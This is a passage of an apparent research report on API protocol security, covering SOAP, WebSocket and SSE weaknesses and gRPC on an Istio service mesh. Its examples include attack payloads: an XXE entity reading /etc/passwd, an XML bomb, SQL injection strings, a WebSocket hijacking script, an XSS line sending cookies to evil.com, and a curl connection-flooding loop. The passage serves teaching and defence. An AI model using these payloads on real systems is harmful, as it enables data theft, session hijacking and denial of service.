This workflow is complex and does not work for clients that implement certificate pinning.

In addition, gRPC is not natively supported by browsers. Testing requires dedicated clients (`grpcurl`, Postman,
BloomRPC), CLI tools, or custom scripts.

---

## 4. SOAP (Simple Object Access Protocol)

### 4.1 Protocol mechanics

SOAP is the veteran of API protocols, developed at the end of the 1990s as a standard for enterprise communication.
Unlike modern protocols (JSON-based REST, protobuf gRPC), SOAP is exclusively XML-based and carries every message in a
structured envelope.

The SOAP architecture has three components:

**SOAP envelope**: the XML wrapper that contains the whole message. Defined by a standard namespace and a rigid
structure.

**SOAP header** (optional): carries metadata such as authentication (WS-Security), routing information, transaction
context.

**SOAP body**: carries the actual payload, typically a method call with parameters.

A typical SOAP message:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="...">
      <wsse:UsernameToken>
        <wsse:Username>alice</wsse:Username>
        <wsse:Password>secret</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/user">
      <m:UserId>123</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

SOAP is protocol-agnostic (it can run over HTTP, SMTP, TCP), but in practice it is almost always carried over HTTP
POST.

Source: GeeksforGeeks, GraphQL vs REST vs SOAP vs gRPC, https://www.geeksforgeeks.org/blogs/graphql-vs-rest-vs-soap-vs-grpc/

The SOAP contract is defined in **WSDL (Web Services Description Language)**, an XML document that states:

- which operations are available (methods);
- which inputs they accept (XML types);
- which outputs they return;
- where the service is hosted (endpoint URL).

A SOAP client generates stub code by analysing the WSDL, as gRPC does with `.proto` files.

The WS-* stack (Web Services specifications) extends SOAP with enterprise capabilities:

- **WS-Security**: authentication, XML digital signature, encryption;
- **WS-ReliableMessaging**: guarantees message delivery even on network failure;
- **WS-Addressing**: routing messages through intermediaries;
- **WS-Policy**: declarations of capabilities and requirements.

This richness makes SOAP powerful for complex enterprise scenarios (distributed transactions, reliable messaging), but
also extremely complex.

Source: Frontiers, Cloud security and SOAP XML vulnerabilities,
https://www.frontiersin.org/journals/computer-science/articles/10.3389/fcomp.2025.1595624/full

### 4.2 Structural weaknesses

Being XML-based, SOAP inherits every XML parsing weakness, amplified by the protocol's complexity.

#### 4.2.1 XML external entity (XXE) injection

XML supports **entities**: aliases defined in the document type definition (DTD) that the parser expands. External
entities can refer to local files or remote URLs.

An attacker can craft a SOAP message with an XXE to read server files:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope>
  <soap:Body>
    <m:GetUser>
      <m:UserId>&xxe;</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

When the parser expands `&xxe;`, it reads `/etc/passwd` and includes it in the processed message. If the server
answers with an error that includes the UserId value, the attacker obtains the file's content.

XXE can also cause SSRF (server-side request forgery):

```xml
<!ENTITY xxe SYSTEM "http://internal-admin-panel.local/api/delete-all">
```

The XML parser sends an HTTP request to the internal URL, bypassing the perimeter firewall.

Statistics report that **21% of web service breaches** involve XXE.

Source: Moldstud, Common SOAP security issues,
https://moldstud.com/articles/p-common-soap-security-issues-understanding-vulnerabilities-and-best-practices

Mitigation requires disabling external entities in the XML parser, but this needs explicit configuration (it is not
the default in many libraries) and many developers are not aware of the risk.

#### 4.2.2 XML signature wrapping (XSW)

WS-Security allows SOAP messages to be digitally signed with XML Signature. The idea: the sender computes a hash of the
message and signs it with a private key. The receiver verifies the signature with the public key.

XML signature wrapping is an attack that manipulates the message's structure while keeping the signature valid. It
exploits the fact that XML Signature references elements by ID, not by position.

Simplified scenario:

```xml
<soap:Body>
  <SignedData Id="data1">
    <Operation>ReadBalance</Operation>
  </SignedData>
  <Signature>
    <Reference URI="#data1">...</Reference>
  </Signature>
</soap:Body>
```

The attacker adds an unsigned element before the signed one:

```xml
<soap:Body>
  <UnsignedData>
    <Operation>TransferMoney</Operation>
  </UnsignedData>
  <SignedData Id="data1">
    <Operation>ReadBalance</Operation>
  </SignedData>
  <Signature>
    <Reference URI="#data1">...</Reference>
  </Signature>
</soap:Body>
```

If the server verifies only the signature (still valid for `#data1`) but processes the first element,
`<UnsignedData>`, the attacker runs an unauthorised operation.

Source: AppSentinels, SOAP API security, https://appsentinels.ai/blog/soap-api-security/

This exploit has compromised real banking and enterprise systems. Mitigation requires checking not only the signature
but also that ALL the relevant content is signed.

#### 4.2.3 XML bomb (billion laughs attack)

XML entities can be defined recursively, causing exponential expansion:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<soap:Body>&lol9;</soap:Body>
```

Each entity expands the previous one tenfold. `lol9` expands to 10^9 times "lol" = 3 GB of string in memory, from a
few KB of XML.

This causes memory exhaustion and immediate DoS. The parser tries to allocate gigabytes of RAM and crashes.

Source: Frontiers, Cloud security and SOAP XML vulnerabilities,
https://www.frontiersin.org/journals/computer-science/articles/10.3389/fcomp.2025.1595624/full

#### 4.2.4 SQL injection through SOAP

Although SOAP uses XML (not SQL), SQL injection is possible if the server concatenates XML values into SQL queries
without sanitisation:

```xml
<soap:Body>
  <m:GetUser>
    <m:UserId>123' OR '1'='1</m:UserId>
  </m:GetUser>
</soap:Body>
```

If the server runs:

```
query = "SELECT * FROM users WHERE id = '" + userId + "'"
```

the injection bypasses authentication. It is classic SQL injection, wrapped in XML.

Source: Infosec Institute, Mastering SOAP request automation, https://resources.infosecinstitute.com/topic/soap-attack-2/

### 4.3 Specific testing challenges

SOAP is the most complex protocol to test because it combines XML parsing, the WS-* stack and WSDL discovery.

#### 4.3.1 WSDL discovery and parsing

SOAP discovery starts by finding the WSDL endpoint:

```
GET /service?wsdl
```

If available, the WSDL is an XML document (often thousands of lines) that defines the available operations. Automatic
WSDL parsers (SoapUI, Postman) generate request templates, but the WSDL may be:

- unpublished (security by obscurity);
- at a custom path (not the standard `?wsdl`);
- protected by authentication.

Without the WSDL, testing is fully black box: one does not know which operations exist.

#### 4.3.2 WS-Security complexity

Testing SOAP authentication requires building valid WS-Security headers with UsernameToken, Timestamp, Signature.
This is manual and error-prone. Automated tools must support:

- XML Signature generation;
- XML Encryption;
- SAML token handling.

Few open source scanners support this. SoapUI does, but needs detailed configuration.

#### 4.3.3 XML parsing attacks

Testing XXE, XML bombs and XSW requires crafting malformed but syntactically valid XML payloads. Generic scanners send
standard XXE payloads, but may not cover the variants (external entity in an attribute, entity in a namespace URI).

Fuzzing XML requires understanding the XML grammar, namespaces, entities, DTDs. Specialised tools exist (FuzzDB XML
payloads, XXEinjector), but integrating them in a SOAP workflow is complex.

---

## 5. WebSocket

### 5.1 Protocol mechanics

WebSocket changes the HTTP request-response model by introducing **persistent full-duplex** communication: client and
server can send messages independently at any time, with no connection open/close overhead per message.

The protocol starts with an **HTTP handshake** that "upgrades" the connection to WebSocket. The client sends a special
GET request:

```
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Version: 13
```

The server answers:

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
```

After this handshake the TCP connection stays open and carries **WebSocket frames** in both directions.

Source: PortSwigger, Testing for WebSockets vulnerabilities, https://portswigger.net/web-security/websockets

A WebSocket frame has a binary structure:

```
Frame header (2-14 bytes):
  - FIN bit: last frame of a multi-frame message
  - Opcode (4 bits): frame type (text=1, binary=2, ping=9, pong=10, close=8)
  - Mask bit: the client MUST mask the payload
  - Payload length (7 bits, 16 bits, or 64 bits for large payloads)
  - Masking key (32 bits, only if Mask=1)
Payload data (variable)
```

**Masking** is mandatory for client-to-server frames (an RFC 6455 requirement). Each payload byte is XORed with a
rotating masking key. This prevents cache poisoning: HTTP proxies that cache GET requests could confuse WebSocket
frames with HTTP responses if they were not masked.

Source (as cited in the thesis): Wikipedia, Server-sent events, https://en.wikipedia.org/wiki/Server-sent_events

Messages in WebSocket flow asynchronously:

```
[Client establishes the WebSocket connection]
    ↓ (HTTP upgrade handshake)
[Connection open - persistent]
    ↓
[Client sends a text frame: {"type": "message", "text": "Hello"}]
    ↓
[Server processes, answers: {"type": "ack", "id": 123}]
    ↓
[Server pushes unprompted: {"type": "notification", "data": "..."}]
    ↓
[Client answers: {"type": "received"}]
    ↓ (The connection stays open indefinitely)
    ↓ (Thousands of messages exchanged with no handshake overhead)
[Client or server sends a Close frame]
```

This persistence removes the HTTP connection latency (TLS handshake, TCP slow start), but introduces stateful
complexity.

WebSocket imposes no payload format: it can be text (typically JSON), binary (protobuf, MessagePack), or anything.
There is no mandatory schema or built-in validation.

### 5.2 Structural weaknesses

WebSocket's stateful, bidirectional nature introduces risks absent in stateless protocols.

#### 5.2.1 Cross-site WebSocket hijacking (CSWSH)

The WebSocket handshake is HTTP, so it is subject to the browser's same-origin policy. WebSocket does NOT, however,
run a **CORS preflight**: the browser sends the upgrade request directly, including cookies.

An attacker can create a malicious page that opens a WebSocket to the victim:

```javascript
// Script on evil.com
var ws = new WebSocket('wss://victim.com/chat');
ws.onmessage = function(e) {
  // Leak the victim's messages to the attacker's server
  sendToAttacker(e.data);
};
```

If `victim.com` does not validate the `Origin` header during the handshake, it accepts the connection. The browser
automatically attaches the session cookies for `victim.com`, so the WebSocket is authenticated as the victim.

The attacker receives every message meant for the victim. This is equivalent to full session hijacking.

Source: Pentest-Tools blog, Cross-site WebSocket hijacking, https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh

Mitigation requires checking the `Origin` header on the server during the handshake:

```
if (request.headers.origin !== 'https://victim.com') {
  return 403 Forbidden
}
```

But this depends on the implementation and is not enforced by the protocol. Many developers are not aware of the risk.

A documented case: CVE-2024-26135 in MeshCentral (remote management software). CSWSH let an attacker control remote
machines by authenticating as the victim.

Source: Praetorian, MeshCentral CSWSH CVE-2024-26135,
https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/

#### 5.2.2 Injection attacks through the frame payload

Input through WebSocket frames is not sanitised by the browser (unlike HTML forms, where the browser prevents some
XSS). If the server relays the payload to every connected client (a chat app), injection is trivial:

```
Client A sends the frame:
{"message": "<script>document.location='http://evil.com?cookie='+document.cookie</script>"}

The server broadcasts to every client:
the clients receive and render the message → XSS
```

This is **stored XSS**: a malicious payload persisted on the server and sent to future clients.

Source: Bright Security, WebSocket security top 8 vulnerabilities,
https://brightsec.com/blog/websocket-security-top-vulnerabilities/

Similarly, if the server uses the payload in a database query:

```
{"action": "getUser", "userId": "123' OR '1'='1"}
```

classic SQL injection, but through WebSocket instead of HTTP POST.

#### 5.2.3 Denial of service patterns

WebSocket opens several DoS vectors:

**Connection exhaustion**: opening N WebSocket connections without closing them. The server keeps state for each
connection (buffers, handlers). With enough connections, the server runs out of file descriptors or memory.

**Message flooding**: sending messages at a very high rate on a single connection. If the server processes every
message (for example broadcasting it to M clients), the load multiplies (N messages × M broadcasts).

**Ping/pong abuse**: WebSocket supports ping frames (heartbeat) and pong responses. An attacker can send endless pings,
forcing the server to answer with pongs, consuming bandwidth and CPU.

Source: Invicti, WebSocket security best practices,
https://www.invicti.com/blog/web-security/websocket-security-best-practices/

#### 5.2.4 Lack of rate limiting

Traditional HTTP rate limiting (X requests per second per IP) does not apply to WebSocket. A single WebSocket
connection (1 HTTP handshake) can send thousands of messages.

If rate limiting is applied only to the handshake (as in many API gateways), WebSocket bypasses the control entirely.

Rate limiting for WebSocket requires application-level tracking: messages per connection, total messages per client
(aggregating several connections), total payload size.

Source: Cobalt, WebSocket vulnerabilities, https://www.cobalt.io/blog/web-socket-vulnerabilites

### 5.3 Specific testing challenges

WebSocket requires stateful tools that keep connections open and handle asynchronous messages.

#### 5.3.1 Stateful connection management

Traditional HTTP scanners (Nikto, Dirb) work in a loop: send a request, wait for the response, close the connection,
next request. WebSocket requires keeping a connection open indefinitely and handling messages in both directions at
the same time.

Tools such as Burp Suite have a dedicated "WebSocket history" tab that captures the handshake and the frames. But
automated testing requires:

- scripts that establish the connection;
- send test payloads;
- listen for asynchronous responses;
- correlate requests and responses (WebSocket has no native request ID).

#### 5.3.2 Origin validation testing

Testing CSWSH requires a complex setup:

- deploy an HTML page on an attacker-controlled domain;
- the page tries to open a WebSocket to the target;
- check whether the connection is accepted (Origin not validated).

This cannot be automated with standard scanners. It needs a framework that can deploy a temporary web server to host
the attack page.

#### 5.3.3 Protocol fuzzing

Fuzzing WebSocket means generating malformed frames:

- invalid opcode (for example opcode=15, undefined);
- payload length mismatch (the header says 100 bytes, the payload has 50);
- Mask bit=0 for client-to-server (violates the RFC);
- fragmentation abuse (FIN=0 forever, with no final frame).

Specialised tools exist (WebSocket fuzzers, wsfuzzer), but their coverage is limited. Complete fuzzing would require
generating every combination of bits in the frame header (2^64+ variants).

---

## 6. Server-Sent Events (SSE)

### 6.1 Protocol mechanics

Server-Sent Events provide one-way server-to-client streaming over a long-lived HTTP connection. Unlike WebSocket
(bidirectional), SSE is simplex: the client can only receive, not send (beyond the initial request).

The mechanism is simple: the client sends an HTTP GET request with a special header:

```
GET /events HTTP/1.1
Host: example.com
Accept: text/event-stream
Cache-Control: no-cache
```

The server answers with:

```
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive
```

Then, instead of closing the connection, the server keeps sending events:

```
data: {"message": "Hello"}

event: update
data: {"status": "active"}
id: 123

: comment (ignored by the client, used for heartbeat)

data: line 1
data: line 2
```

Each event is separated by a double newline. The `data` field carries the payload (typically JSON). The `event` field
states the event type (optional). The `id` field allows resuming (the client reconnects with the `Last-Event-ID`
header).

Source: MDN, Using server-sent events,
https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events

The browser provides the native `EventSource` API:

```javascript
const eventSource = new EventSource('/events');

eventSource.onmessage = (e) => {
  console.log('Received:', e.data);
};

eventSource.addEventListener('update', (e) => {
  console.log('Update:', e.data);
});
```

`EventSource` reconnects automatically if the connection drops. After a disconnect it retries with exponential
backoff.

Source: Solita, Server-sent events, https://dev.solita.fi/2024/08/15/server-sent-event.html

The typical flow:

```
[Client: EventSource('/events')]
    ↓ (HTTP GET)
[Server]
    ↓ (Response 200 OK, Content-Type: text/event-stream)
    ↓ (The connection stays open indefinitely)
    ↓
[Server sends an event when available]
    data: {"new_comment": {...}}

[Client receives it, the onmessage callback fires]
    ↓
[Server keeps streaming for hours/days]
    ↓
[If the connection drops (network issue)]
[EventSource reconnects automatically with Last-Event-ID]
```

SSE has a browser limitation: at most 6 simultaneous connections per domain (the HTTP/1.1 limit). Opening a 7th
EventSource blocks until one of the 6 closes. HTTP/2 removes this limit.

### 6.2 Structural weaknesses

SSE, although simple, introduces risks specific to its long-lived, one-way nature.

#### 6.2.1 Token expiry during the stream

An SSE connection can last hours or days. If authentication uses a JWT with an expiry (for example 1 hour), the token
expires mid-stream.

Scenario:

```
T=0:      the client establishes SSE with a JWT (expiry: 1h)
T=30min:  events flow normally
T=1h+1s:  the JWT has expired
```

What happens then? It depends on the implementation:

- if the server checks the JWT only during the initial handshake, the stream continues (security issue: a client
  with an expired token receives data);
- if the server checks the JWT periodically, it closes the stream (usability issue: the client loses the connection
  for no apparent reason).

Neither option is ideal. Mitigation requires a refresh token mechanism: the server sends a special event
`event: token-expiring`, the client refreshes the token and reconnects with the new one.

Source: Treblle, How SSE and STDIO can ruin your API security, https://treblle.com/blog/sse-stdio-api-security

This workflow is complex and often not implemented, leaving SSE exposed to eternal sessions or frequent disconnects.

#### 6.2.2 CORS misconfiguration

SSE follows the standard CORS (cross-origin resource sharing) policy. The server must include the header:

```
Access-Control-Allow-Origin: https://trusted-domain.com
```

A common mistake:

```
Access-Control-Allow-Origin: *
```

This lets any domain consume the SSE stream. If the stream carries sensitive data (personal notifications,
transactions), an attacker on `evil.com` can subscribe and read the data.

Source: Treblle, How SSE and STDIO can ruin your API security, https://treblle.com/blog/sse-stdio-api-security

Unlike WebSocket (which needs an active Origin check during the handshake), CORS for SSE is passive: if the server
configures no Access-Control headers, the browser applies the same-origin policy; the problem is a header configured
too permissively.

#### 6.2.3 Resource exhaustion

The server cannot limit the duration of an SSE connection a priori (clients may legitimately need long-lived
streams). But a malicious client can open N SSE connections and never close them, exhausting server threads or
processes.

The difference with WebSocket: SSE is standard HTTP, so it is easier to abuse (no WebSocket-aware client needed,
`curl` is enough):

```bash
for i in {1..1000}; do
  curl -N http://target.com/events &
done
```

1000 simultaneous SSE connections, all idle, consuming server resources.

Mitigation requires a server-side timeout (for example close the connection after 1 hour of inactivity), but this
breaks legitimate long-term monitoring use cases.

Source: Microsoft Learn, Configure API for server-sent events in Azure API Management,
https://learn.microsoft.com/en-us/azure/api-management/how-to-server-sent-events

#### 6.2.4 Lack of HTTPS

SSE over plain HTTP (`http://`) is vulnerable to MITM: an attacker intercepts the stream, reads the events, and can
even inject fake events by modifying the response.

Unlike WebSocket (which has the wss:// scheme for TLS), SSE has no separate scheme. A client uses
`new EventSource('http://...')` with no browser warning.

The best practice is ALWAYS to use HTTPS for SSE, but this is not enforced.

Source: DEV Community, The hidden risks of SSE,
https://dev.to/patrick_61cbc6392b72286f6/the-hidden-risks-of-sseserver-sent-events-what-developers-often-overlook-1b34

### 6.3 Specific testing challenges

SSE is the least tested protocol because traditional tools assume short HTTP responses.

#### 6.3.1 Long-duration connections

HTTP scanners set timeouts (30 s, 60 s). An SSE connection lasts hours. If a scanner sends a GET to `/events` and waits
for the response, the timeout fires and the scanner assumes "the server does not answer", when in fact SSE is working
correctly.

Testing SSE requires a client that:

- keeps the connection open indefinitely;
- processes streaming events (does not buffer the whole response);
- checks the event format (structure validation).

Tools such as `curl` with the `-N` flag (no buffering) can receive SSE, but do not validate it automatically.

#### 6.3.2 Heartbeat detection

An SSE server should send periodic heartbeats (comment lines) to avoid load balancer/proxy timeouts. Testing must
check that:

- the heartbeat is present (at least every X seconds);
- the heartbeat does not interfere with real events;
- the EventSource client handles the heartbeat correctly (ignores comments).

This requires monitoring over time: collecting events for minutes and analysing the intervals.

#### 6.3.3 Reconnection and Last-Event-ID

Testing automatic reconnection requires:

- establishing the SSE connection;
- the server sends events with sequential IDs (id: 1, id: 2, id: 3);
- forcing a disconnect (killing the TCP connection);
- checking that the client reconnects with the header `Last-Event-ID: 3`;
- checking that the server resumes from ID 4 (and does not resend IDs 1-3).

This workflow is complex and requires fine control over the network layer (forcing the disconnect) and the
application layer (checking headers and received events).

---

## Conclusions of phase 1.B

The analysis of the six API protocols shows that no protocol is "secure by default". Every design choice introduces a
trade-off between functionality, performance and security. REST offers simplicity but suffers from over-fetching and
endpoint proliferation. GraphQL solves these problems but introduces query complexity attacks and batching bypass.
gRPC provides excellent performance but with a binary opacity that makes inspection impossible. SOAP guarantees
enterprise standardisation but with an XML complexity that opens the door to XXE and XML bombs. WebSocket enables
real-time bidirectional communication but with CSWSH and rate limiting bypass risks. SSE provides simple streaming but
with token expiry and resource exhaustion.

Each protocol requires a different testing strategy. Generic tools (Burp, ZAP, Nikto) adequately cover only REST.
GraphQL requires query complexity analysis and introspection probing. gRPC requires a protobuf decoder and reflection
discovery. SOAP requires an XML fuzzer and WS-Security handling. WebSocket requires a stateful client with Origin
validation testing. SSE requires long-duration connection management.

An effective security assessment framework must recognise the protocol in use (fingerprinting), select the
appropriate tools, and apply protocol-specific tests. The next phase combines this knowledge with the architectures
of phase 1.A, studying how architecture-protocol interactions create blind spots and amplified testing complexity.

---

## Technical bibliography (phase 1.B)

### REST

- Baeldung - REST vs GraphQL vs gRPC: https://www.baeldung.com/rest-vs-graphql-vs-grpc
- DesignGurus - REST vs GraphQL vs gRPC System Design: https://www.designgurus.io/blog/rest-graphql-grpc-system-design
- LogRocket Blog - GraphQL vs gRPC vs REST: https://blog.logrocket.com/graphql-vs-grpc-vs-rest-choosing-right-api/

### GraphQL

- GraphQL Specification: https://spec.graphql.org/
- Pradeep Loganathan's Blog - API Architecture Showdown: https://pradeepl.com/blog/api/rest-vs-graphql-vs-grpc/
- Medium - REST vs GraphQL vs gRPC: https://mobilelive.medium.com/rest-vs-graphql-vs-grpc-comparing-three-modern-api-technologies-9ba58abadd82

### gRPC

- gRPC Official Documentation: https://grpc.io/docs/
- gRPC Protocol Specification: https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-HTTP2.md
- Kong Blog - REST vs gRPC vs GraphQL: https://konghq.com/blog/engineering/rest-vs-grpc-vs-graphql
- GeeksforGeeks - GraphQL vs REST vs SOAP vs gRPC: https://www.geeksforgeeks.org/blogs/graphql-vs-rest-vs-soap-vs-grpc/

### SOAP

- Bright Security - SOAP Security Top Vulnerabilities: https://brightsec.com/top-7-soap-api-vulnerabilities/
- Frontiers - Cloud Security and SOAP XML Vulnerabilities: https://www.frontiersin.org/journals/computer-science/articles/10.3389/fcomp.2025.1595624/full
- Bright Security - SOAP API Security: https://appsentinels.ai/blog/soap-api-security/
- Moldstud - Common SOAP Security Issues: https://moldstud.com/articles/p-common-soap-security-issues-understanding-vulnerabilities-and-best-practices
- OWASP - SOAP Attack Penetration Testing: https://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/
- Infosec Institute - Mastering SOAP Request Automation: https://resources.infosecinstitute.com/topic/soap-attack-2/
- DreamFactory Blog - Understanding SOAP Security: https://blog.dreamfactory.com/understanding-soap-security
- StackHawk Docs - SOAP XML Injection: https://docs.stackhawk.com/vulnerabilities/90029/
- Snyk - XXE Injection in SOAP: https://security.snyk.io/vuln/SNYK-JAVA-SOAP-3034822

### WebSocket

- PortSwigger - Testing for WebSockets Vulnerabilities: https://portswigger.net/web-security/websockets
- Ably - WebSocket Security: https://ably.com/topic/websocket-security
- OWASP - Testing WebSockets: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets
- Bright Security - WebSocket Security Top 8 Vulnerabilities: https://brightsec.com/blog/websocket-security-top-vulnerabilities/
- Pentest-Tools Blog - Cross-Site WebSocket Hijacking: https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh
- Invicti - WebSocket Security Best Practices: https://www.invicti.com/blog/web-security/websocket-security-best-practices
- Vaadata - How WebSockets Work Vulnerabilities: https://www.vaadata.com/blog/how-websockets-work-vulnerabilities-and-security-best-practices/
- Praetorian - MeshCentral CSWSH CVE-2024-26135: https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/
- Cobalt - Web Socket Vulnerabilities: https://www.cobalt.io/blog/web-socket-vulnerabilites
- Appknox - WebSocket Pentesting: https://www.appknox.com/blog/everything-you-need-to-know-about-web-socket-pentesting

### Server-Sent Events (SSE)

- Wikipedia - Server-Sent Events: https://en.wikipedia.org/wiki/Server-sent_events
- MDN - Using Server-Sent Events: https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events
- API7 - Understanding SSE and Its Benefits: https://api7.ai/blog/what-is-sse
- Treblle - How SSE and STDIO Can Ruin Your API Security: https://treblle.com/blog/sse-stdio-api-security
- Microsoft Learn - Configure API for SSE in Azure API Management: https://learn.microsoft.com/en-us/azure/api-management/how-to-server-sent-events
- Postman Blog - Support for Server-Sent Events: https://blog.postman.com/support-for-server-sent-events/
- Solita - Server-Sent Events: https://dev.solita.fi/2024/08/15/server-sent-event.html
- DEV Community - Hidden Risks of SSE: https://dev.to/patrick_61cbc6392b72286f6/the-hidden-risks-of-sseserver-sent-events-what-developers-often-overlook-1b34

### General Resources

- System Design School - REST vs gRPC vs GraphQL: https://systemdesignschool.io/blog/rest-grpc-graphql
- SmartDev - AI-Powered APIs Performance: https://smartdev.com/ai-powered-apis-grpc-vs-rest-vs-graphql/

**End of phase 1.B: API protocols and architectural styles**

# Phase 1.C: Architecture-protocol interaction matrix

**Date:** 31 January 2026
**Version:** 3.0 (final version, technical gaps integrated)

---

## Introduction

Architectures and protocols, analysed separately, have understandable and documentable characteristics. An API
gateway offers centralisation and control. REST provides resource-oriented interfaces. Both have known weaknesses and
established mitigation strategies. The problem appears when the two worlds meet: the intersection of a specific
architecture with a particular protocol creates emergent complexity that cannot be predicted by analysing the
components one by one.

This phenomenon, which we could call **architectural impedance mismatch**, appears when the design assumptions of one
layer (for example "all traffic is stateless HTTP") are violated by the characteristics of another layer (for example
"WebSocket needs persistent stateful connections"). The result is structural blind spots: points where traditional
security tools fail, where standard configurations are inadequate, and where attack surfaces grow in non-obvious
ways.

This section analyses the critical interactions between cloud-native architectures (phase 1.A) and modern API
protocols (phase 1.B). The approach is twofold: first the **physiology** of the integration (how the combinations
normally work when implemented according to best practice), then the **pathology** (where problems arise, which
assumptions are violated, and why standard security mechanisms fail).

The goal is not an exhaustive catalogue of every possible combination, but to identify the most significant
interactions by deployment frequency, technical complexity, and security impact. For each interaction we analyse: the
standard implementation pattern, the technical integration mechanism, the architectural assumptions involved, and the
blind spots that appear when those assumptions are violated.

---

# Part 1: Physiology, standard implementation patterns

## Introduction to the physiology

When architectures and protocols work together correctly, the result is a system that uses the strengths of both. An
API gateway handles centralised authentication for REST APIs. A Kubernetes ingress controller routes gRPC traffic to
backend services. A service mesh applies automatic mTLS to internal GraphQL communication. These patterns,
established in recent years, are documented best practices implemented in production by organisations of every size.

Understanding how these "physiological" patterns work is essential before analysing the failures. Only by
understanding the normal flow can we identify where it breaks. This section describes six dominant integration
patterns, highlighting technical mechanisms, required configuration, and benefits obtained.

---

## 1. gRPC + Kubernetes service mesh

### 1.1 The standard pattern

gRPC is the preferred protocol for service-to-service (east-west) communication in Kubernetes microservice
environments. The service mesh (typically Istio) amplifies gRPC's benefits by automatically handling mTLS, Layer 7 load
balancing, and observability.

The typical architectural pattern:

```
[Pod A - gRPC client]
  [Application container] → (gRPC call to "grpc-server:9090")
      ↓ (localhost redirect via iptables rules)
  [Envoy sidecar proxy]
      ↓ (mTLS encryption - X.509 certificate from istiod)
      ↓ (Service discovery via Kubernetes DNS)
      ↓ (L7 load balancing - round robin between endpoints)
  (Network - encrypted traffic)
      ↓
[Pod B - gRPC server]
  [Envoy sidecar proxy]
      ↓ (mTLS decryption)
      ↓ (Authorization policy enforcement)
      ↓ (Metrics collection - latency, throughput)
  [Application container] ← (gRPC request in plain text)
```

### 1.2 Technical integration mechanism

The service mesh intercepts gRPC traffic with no change to the application code. When pod A is created, Istio's
injection controller automatically injects the Envoy sidecar and configures iptables rules that redirect all outgoing
traffic through the proxy.

The application container simply calls:

```
client = grpc.NewClient("grpc-server.namespace.svc.cluster.local:9090")
```

Kubernetes DNS resolves this hostname to the Service's ClusterIP. Instead of reaching the backend directly, however,
the traffic is intercepted by the local Envoy sidecar through iptables rules inserted by the `istio-init` init
container.

Envoy asks the istiod control plane for:

- **endpoint discovery**: the list of pod IPs implementing the service (through the xDS Endpoint Discovery Service);
- **TLS certificates**: the X.509 certificate of the current workload and the CA certificate to validate the peer;
- **load balancing policy**: the algorithm (round robin, least request, random) and the health check configuration.

Source: Istio documentation, traffic management (knowledge of the Istio architecture)

The sidecar establishes an HTTP/2 connection with one of the backend endpoints, performs a mutual TLS handshake (both
sides present certificates), and proxies the gRPC request. All of this is transparent to the application layer.

### 1.3 Layer 7 load balancing

A critical aspect of this integration is that the service mesh implements **Layer 7** load balancing for gRPC, unlike
the standard Kubernetes Service (Layer 4).

A Kubernetes Service (ClusterIP) is a Layer 4 load balancer implemented by kube-proxy. When a gRPC client opens an
HTTP/2 connection to a Service, kube-proxy routes the TCP connection to one of the backend pods. But gRPC multiplexing
means that many RPC requests travel on the same TCP connection.

The problem: kube-proxy balances TCP connections, not RPC requests. If a client opens one connection to the Service,
all its later requests go to the same backend pod, causing imbalance:

```
Client 1 → Service (kube-proxy) → Pod A (100 requests/s)
Client 2 → Service (kube-proxy) → Pod B (5 requests/s)
Client 3 → Service (kube-proxy) → Pod C (2 requests/s)
```

Three clients, but an unbalanced distribution because client 1 sends much more traffic on its connection.

Source: Medium, Don't load balance gRPC using Kubernetes Service,
https://medium.com/@lapwingcloud/dont-load-balance-grpc-or-http2-using-kubernetes-service-ae71be026d7f

The service mesh solves this because Envoy understands HTTP/2: it balances individual RPC requests, not TCP
connections. Each gRPC call is distributed independently among the available backends, ensuring a fair distribution
even with few clients.

### 1.4 Best practice configuration

For a gRPC deployment on Kubernetes with Istio, the configuration requires:

A **Service definition** whose port name states that the service uses gRPC:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: grpc-server
  labels:
    app: grpc-server
spec:
  ports:
    - port: 9090
      name: grpc  # the port name must start with the protocol
  selector:
    app: grpc-server
```

The `name: grpc` naming convention is critical. Istio uses it to determine that the traffic is gRPC and apply the
appropriate configuration (HTTP/2, protobuf-aware metrics).

A **DestinationRule** to configure load balancing:

```yaml
apiVersion: networking.istio.io/v1
kind: DestinationRule
metadata:
  name: grpc-server
spec:
  host: grpc-server.namespace.svc.cluster.local
  trafficPolicy:
    loadBalancer:
      simple: ROUND_ROBIN
    connectionPool:
      http:
        http2MaxRequests: 100
        maxRequestsPerConnection: 10
```

This configuration limits concurrent requests to prevent overload and defines the load balancing algorithm.

